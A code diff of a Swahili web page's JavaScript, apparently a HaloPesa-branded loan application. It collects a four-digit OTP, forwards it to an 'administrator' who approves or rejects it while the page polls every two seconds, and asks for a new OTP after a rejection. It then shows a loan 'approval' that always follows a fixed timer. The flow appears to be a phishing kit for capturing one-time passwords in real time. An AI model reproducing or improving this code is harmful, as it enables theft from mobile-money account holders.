         document.getElementById('otpMsgOkTxt').textContent = 'OTP imetumwa kwa msimamizi kwa uthibitisho';
-        
-        // Start polling for OTP approval
         startOtpApprovalPolling();
       } else {
-        const error = await response.json();
-        clearErr('otpMsgOk');
-        document.getElementById('otpMsgErr').classList.add('show');
-        document.getElementById('otpMsgErrTxt').textContent = error.message || 'Hitilafu inatokea';
+        showErr('otpMsgErr', 'Hitilafu inatokea');
       }
     } catch (error) {
-      console.error('Submit OTP error:', error);
-      clearErr('otpMsgOk');
-      document.getElementById('otpMsgErr').classList.add('show');
-      document.getElementById('otpMsgErrTxt').textContent = 'Hitilafu inatokea';
+      showErr('otpMsgErr', 'Hitilafu inatokea');
     }
   }
 
@@ -469,54 +542,85 @@
         const data = await response.json();
 
         if (data.status === 'approved') {
-          console.log('✅ OTP approved by admin');
           clearInterval(otpCheckInterval);
-          
-          clearErr('otpMsgErr');
           document.getElementById('otpMsgOk').classList.add('show');
-          document.getElementById('otpMsgOkTxt').textContent = 'OTP ilithibitishwa! Karibu na HaloPesa';
+          document.getElementById('otpMsgOkTxt').textContent = 'OTP ilithibitishwa! Endelea na mkopo wako…';
           
           setTimeout(() => {
             closeOtpModal();
-            goTo('page-landing');
+            goTo('page-step1');
           }, 1500);
         } else if (data.status === 'rejected') {
-          console.log('❌ OTP rejected by admin');
           clearInterval(otpCheckInterval);
-          
-          clearErr('otpMsgOk');
           document.getElementById('otpMsgErr').classList.add('show');
           document.getElementById('otpMsgErrTxt').textContent = 'OTP haisemi. Tafadhali jaribu OTP nyingine';
           
-          // Allow retry - clear boxes
           setTimeout(() => {
-            document.getElementById('o0').value = '';
-            document.getElementById('o1').value = '';
-            document.getElementById('o2').value = '';
-            document.getElementById('o3').value = '';
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('o0').focus();
-            clearErr('otpMsgErr');
+            document.getElementById('otpMsgErr').classList.remove('show');
           }, 2000);
         }
       } catch (error) {
         console.error('OTP status check error:', error);
       }
-    }, 2000); // Poll every 2 seconds
+    }, 2000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // CALCULATOR
-  // ══════════════════════════════════════════════════════
-  function calcUp() {
-    const a = +document.getElementById('rA').value;
-    const t = 48; // Default
-    const r = 0.25 / 12;
-    const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-    document.getElementById('aDisp').textContent = 'TSh ' + a.toLocaleString();
-    document.getElementById('rA').style.setProperty('--pct', ((a-10000)/(100000000-10000)*100).toFixed(2) + '%');
+  // ════════════════════════════════════════════════════════
+  // LOAN APPLICATION STEPS
+  // ════════════════════════════════════════════════════════
+  function toS2() {
+    const amt = document.getElementById('s1am').value;
+    const purpose = document.getElementById('s1pu').value.trim();
+    
+    if (!amt || Number(amt) <= 0) {
+      showErr('s1Err', 'Tafadhali weka kiasi sahihi'); return;
+    }
+    if (!purpose) {
+      showErr('s1Err', 'Tafadhali elezea madhumuni'); return;
+    }
+    
+    S.amt = amt;
+    S.term = document.getElementById('s1te').value;
+    S.purpose = purpose;
+    goTo('page-step2');
   }
 
-  calcUp();
+  function toS3() {
+    const phone = document.getElementById('s2ph').value.trim();
+    if (!phone || phone.length < 9) {
+      showErr('s2Err', 'Tafadhali weka nambari sahihi'); return;
+    }
+    
+    S.phone = '+255' + phone;
+    document.getElementById('sA').textContent = 'TSh ' + Number(S.amt).toLocaleString();
+    document.getElementById('sT').textContent = S.term;
+    document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+    goTo('page-step3');
+  }
+
+  function submitApp() {
+    const income = document.getElementById('s3in').value;
+    if (!income || Number(income) <= 0) {
+      showErr('s3Err', 'Tafadhali weka mapato'); return;
+    }
+    
+    document.getElementById('mSubmit').classList.add('show');
+    
+    setTimeout(() => {
+      document.getElementById('mSubmit').classList.remove('show');
+      document.getElementById('apAmt').textContent = 'TSh ' + Number(S.amt).toLocaleString();
+      document.getElementById('apTerm').textContent = S.term;
+      const a = Number(S.amt);
+      const t = parseInt(S.term);
+      const r = 0.08 / 12;
+      const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
+      document.getElementById('apMthly').textContent = 'TSh ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+      goTo('page-approval');
+    }, 1500);
+  }
 </script>
+
 </body>
 </html>
